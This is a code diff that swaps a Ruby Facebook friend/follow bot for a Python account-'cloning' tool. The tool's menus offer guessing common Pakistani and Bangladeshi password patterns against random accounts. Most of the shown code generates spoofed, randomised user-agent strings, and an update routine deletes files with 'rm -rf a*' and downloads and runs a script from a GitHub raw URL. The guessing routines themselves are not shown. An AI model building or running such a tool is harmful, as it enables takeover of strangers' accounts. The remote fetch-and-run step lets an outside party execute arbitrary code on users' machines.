+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Windows NT 10.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Win64; x64'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    aa='Mozilla/5.0 (Series40;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Nokia2000/11.95;'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='S40OviBrowser/2.2.0.0.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['ASUS_Z01QD'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/72.0.3626.76 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 9;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['PortalTV'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/85.0.4183.120 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 9;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 5.1;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['GT-810 Build/LMY47I'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/66.0.3359.106 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; U; Android 2.2;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='fr-fr; Desire_A8181 Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l=' 4.0 Mobile Safari/533.1'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (SMART-TV;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='Linux; Tizen 2.4.0)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/538.1'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='fr-fr; GT-S5839i Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='4.0 Mobile Safari/534.30'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 4.0.4;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='LT30p Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='18.0.1025.166 Mobile Safari/535.19'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
 
-def AddFriendMenu()
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Add Friend From Target Id")
-  puts ("#{$w}║-> 2. Add Friend From Friend")
-  puts ("#{$w}║-> 3. Add Friend From File Id")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      AddTarget()
-    when '2'
-      AddFrind()
-    when '3'
-      AddFile()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      AddFriendMenu()
-  end
-end
+    aa='Mozilla/5.0 (Linux; Android 7.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/63.0.3239.111 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 9 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 9 Pro)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['ASUS_I005DA)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/102.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Vivo Y91C)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/98.0.4711.185 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['M2012K11AG Build/'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Vivo Y91C)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/97.0.4740.200 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['CPH1909 Build/O11019 )'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
 
-def AddTarget()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  a = Request("#{id}?")
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if a.key? ('name')
-    b = Request("POST","me/friends/#{id}?")
-    if b == true
-      puts ("#{$g}[✓] Name : #{a['name']}")
-      puts ("#{$g}[✓] Status : Success")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      AddFriendMenu()
-    else
-      puts ("#{$y}[!] Name : #{a['name']}")
-      puts ("#{$y}[!] Status : Failed")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      AddFriendMenu()
-    end
-  else
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
+logo = """
+ \033[1;30m$$$$$$\ $$\     $$\  $$$$$$\  $$\   $$\ 
+ \033[1;31m$$  __$$\\$$\   $$  |$$  __$$\ $$$\  $$ |
+ \033[1;32m$$ /  $$ |\$$\ $$  / $$ /  $$ |$$$$\ $$ |
+ \033[1;33m$$$$$$$$ | \$$$$  /  $$$$$$$$ |$$ $$\$$ |
+ \033[1;34m$$  __$$ |  \$$  /   $$  __$$ |$$ \$$$$ |
+ \033[1;35m$$ |  $$ |   $$ |    $$ |  $$ |$$ |\$$$ |
+ \033[1;36m$$ |  $$ |   $$ |    $$ |  $$ |$$ | \$$ |
+ \033[1;37m\__|  \__|   \__|    \__|  \__|\__|  \__|\033[1;32m ARAIN🤟❤✌\033[1;37m 
+--------------------------------------------------
+[•] AUTHOR       : \033[1;31mAYAN\033[1;31m
+[•] CONTACT     : \033[1;33m+971564382087🙉\033[1;33m
+[•] TOOL NAME : \033[1;32mAYAN\033[1;32m
+[•] TOOL TYPE  : \033[1;34mRANDOM\033[1;34m
+[•] STATUS         : \033[1;35mFREE\033[1;35m
+--------------------------------------------------
+[•] \033[1;37mVERSION    :\033[1;32m 1.2 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+--------------------------------------------------"""
 
-def AddFrind()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Public Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=friends.limit(#{limit})")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  elsif !a.key? ('friends')
-    puts ("#{$y}[!] There are no friends on the account")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  else
-    for i in a['friends']['data']
-      b = Request("POST","me/friends/#{i['id']}")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
+def lines():
+	print('\33[1;37m--------------------------------------------------')
+loop = 0
+oks = []
+cps = []
+try:
+    print('\n\033[1;37m[•] JOIN MY WHATSAP PGROUP')
+    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
+    v = 3.1
+    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
+    if str(v) in update:
+        os.system('rm -rf a*')
+        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
+        os.system('python ali.py')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 
-def AddFile()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id : ")
-  file = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if File.file? (file)
-    files = File.readlines(file, chomp: true).uniq
-    for i in files[0...limit]
-      a = Request("#{i}?")
-      next if a.key? ('error')
-      b = Request("POST","me/friends/#{i}?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  else
-    puts ("#{$y}[!] File Not Found!")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    AddFriendMenu()
-  end
-end
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
 
-def FollowMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Follow target Id")
-  puts ("#{$w}║-> 2. Follow From friend")
-  puts ("#{$w}║-> 3. Follow Friend from Friend")
-  puts ("#{$w}║-> 4. Follow From File Id")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      FollowTarget()
-    when '2'
-      FollowFriend()
-    when '3'
-      FollowFromFriend()
-    when '4'
-      FollowFile()
-    when '0'
-      Bot()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      FollowMenu()
-  end
-end
+def rehan():
+	os.system('clear')
+	print(logo)
+	print('[1] RANDOM PAK CLONING')
+	print('[2] RANDOM BD CLONING')
+	print('[3] RANDOM CHOICE PASS CLONING')
+	print('[4] CONTACT WITH OWNER')
+	print('[0] EXIT')
+	lines()
+	gh = input('[•] CHOOSE : ')
+	if gh =='1':
+		menu()
+	elif gh =='2':
+		bd()
+	elif gh =='3':
+		chos()
+	elif gh =='4':
+		os.system('xdg-open http://Wa.me/+97564382087')
+	elif gh =='0':
+		print('[•] THANKS FOR USE ')
+		time.sleep(3)
+		exit()
+	else:
+		print('[•] CHOOSE CORRECT OPTION')
+		time.sleep(2)
+		rehan()
 
-def FollowTarget()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  tik("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    b = Request("POST","#{id}/subscribers?")
-    if b == true
-      puts ("#{$g}[✓] Name : #{a['name']}")
-      puts ("#{$g}[✓] Status : Success")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      FollowMenu()
-    else
-      puts ("#{$y}[!] Name : #{a['name']}")
-      puts ("#{$y}[!] Status : Failed")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      FollowMenu()
-    end
-  end
-end
+def menu():
+	os.system('clear')
+	print(logo)
+	print('[1] LAST 7 DIGIT')
+	print('[2] ALI + KHAN PASS')
+	print('[3] MALIK + BALOCH PASS')
+	print('[4] BEST FOR PUBG IDS')
+	print('[5] BEST FOR FREE FIRE IDS')
+	print('[0] EXIT TO MAIN MENU')
+	lines()
+	opt = input('[•] CHOOSE: ')
+	if opt =='1':
+		svn_digit()
+	elif opt =='2':
+		ali_khan()
+	elif opt =='3':
+		malik_baloch()
+	elif opt =='4':
+		pubg()
+	elif opt =='5':
+		ff()
+	elif opt =='0':
+		rehan()
+	else:
+		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
+		time.sleep(2)
+		menu()
 
-def FollowFriend()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading...")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("me/friends?limit=#{limit}")
-  abort ("#{$y}[!] Error") if a.key? ('error')
-  for i in a['data']
-    id = i['id']
-    name = i['name']
-    b = Request("POST","#{id}/subscribers?")
-    if b == true
-      s += 1
-      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-    else
-      f += 1
